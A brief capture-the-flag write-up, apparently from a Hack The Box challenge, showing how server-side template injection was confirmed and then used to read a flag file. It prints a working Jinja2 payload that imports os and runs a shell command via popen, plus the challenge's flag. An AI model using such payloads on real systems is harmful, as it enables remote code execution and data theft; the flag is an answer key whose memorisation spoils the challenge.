



To test if the website is vulnerable to an SSTI let's put this playload :

![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260305133002.png)



Now let's find the flag with this payload :

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```


![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260305132715.png)

Flag :

```
HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
```